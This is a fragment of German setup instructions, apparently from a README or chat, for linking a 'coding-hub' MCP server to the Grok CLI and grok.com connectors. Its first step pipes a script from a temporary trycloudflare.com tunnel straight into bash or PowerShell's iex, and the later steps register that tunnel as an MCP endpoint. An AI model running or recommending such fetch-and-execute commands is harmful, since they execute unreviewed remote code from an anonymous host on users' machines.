...
1. Auf deinem Rechner: `curl -fsSL https://pathology-playlist-bookstore-php.trycloudflare.com/api/couple-all.sh | bash` (Windows: `irm https://pathology-playlist-bookstore-php.trycloudflare.com/api/couple-all.ps1 | iex`)
...
6. CLI MCP: `grok mcp add --transport http coding-hub https://pathology-playlist-bookstore-php.trycloudflare.com/mcp`
7. Im Bot chatten:
...
8. Optional: [grok.com/connectors](https://grok.com/connectors) → Custom → `https://pathology-playlist-bookstore-php.trycloudflare.com/mcp`
